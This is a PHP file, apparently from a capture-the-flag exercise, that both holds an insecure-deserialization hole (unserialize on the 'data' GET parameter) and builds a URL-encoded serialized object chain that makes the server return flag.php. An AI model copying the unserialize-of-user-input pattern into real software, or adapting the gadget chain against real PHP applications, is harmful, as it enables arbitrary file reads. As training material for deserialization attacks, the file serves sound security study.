<?php  

class baby 

{   

    protected $skyobj;  

    public $aaa;

    public $bbb;

    function __construct() 

    {      

        $this->skyobj = new cool;  // 修改成调用cool类

        $this->skyobj->amzing= serialize(new sec);

        $this->skyobj->filename = "flag.php";

        

    }  

    function __toString()      

    {          

        if (isset($this->skyobj))  

            return $this->skyobj->read();      

    }  

}  

class sec 

{  

    function read()     

    {          

        return "it's so sec~~";      

    }  

}  

class cool 

{    

    public $filename;     

    public $nice;

    public $amzing; 

    function read()      

    {   

        echo 'this->amzing:'.$this->amzing;

        $this->nice = unserialize($this->amzing);

        $this->nice->aaa = $sth;

        if($this->nice->aaa === $this->nice->bbb)

        {

            $file = "./{$this->filename}";        

            if (file_get_contents($file))         

            {              

                return file_get_contents($file); 

            }  

            else 

            { 

                return "you must be joking!"; 

            }    

        }

    }  

}  

  

if (isset($_GET['data']))  

{ 

    $Input_data = unserialize($_GET['data']);

    echo $Input_data; 

}else{

    $baby = new baby();

    $baby->aaa = "read";

    $baby->bbb = "read";

    

    echo(urlencode(serialize($baby)));

}

?>


